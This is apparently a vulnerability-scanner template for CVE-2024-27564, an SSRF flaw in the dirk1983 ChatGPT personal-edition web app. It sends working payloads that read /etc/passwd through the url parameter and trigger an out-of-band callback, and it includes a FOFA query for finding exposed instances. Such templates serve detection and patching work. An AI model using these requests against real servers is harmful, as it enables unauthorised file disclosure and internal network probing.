id: CVE-2024-27564

info:
  name: ChatGPT个人专用版 - Server Side Request Forgery
  author: DhiyaneshDK
  severity: medium
  description: |
    A Server-Side Request Forgery (SSRF) in pictureproxy.php of ChatGPT commit f9f4bbc allows attackers to force the application to make arbitrary requests via injection of crafted URLs into the urlparameter.
  reference:
    - https://github.com/dirk1983/chatgpt/issues/114
    - https://nvd.nist.gov/vuln/detail/CVE-2024-27564
    - https://web.archive.org/save/https://github.com/dirk1983/chatgpt/blob/f9f4bbc99eed7210b291ec116bd57b3d8276bee5/README.md
    - https://web.archive.org/save/https://github.com/dirk1983/chatgpt/issues/114
    - https://web.archive.org/web/20250320031248/https://mm1.ltd/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N
    cvss-score: 5.8
    cve-id: CVE-2024-27564
    cwe-id: CWE-918
    epss-score: 0.91787
    epss-percentile: 0.99658
    cpe: cpe:2.3:a:dirk1983:chatgpt:2023-05-23:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: dirk1983
    product: chatgpt
    fofa-query: "title=\"ChatGPT个人专用版\""
  tags: cve,cve2024,chatgpt,ssrf,oast,oos,lfi,chanzhaoyu

http:
  - method: GET
    path:
      - "{{BaseURL}}/pictureproxy.php?url=file:///etc/passwd"
      - "{{BaseURL}}/pictureproxy.php?url=http://{{interactsh-url}}"

    stop-at-first-match: true

    matchers-condition: or
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(header, "image/jpeg")
          - regex('root:.*:0:0:', body)
        condition: and

      - type: dsl
        dsl:
          - contains(interactsh_protocol, "dns")
          - contains(header, "image/jpeg")
          - status_code == 200
        condition: and
# digest: 490a0046304402207d2ad17f0cdb85266d6729b06113bb23ceb83d34b045cf9288b000e7aac9f64b02200108a9e7843af4456286119228622ebb3336d8bd8bfeb6bac202df22427a2d41:922c64590222798bb761d5b6d8e72950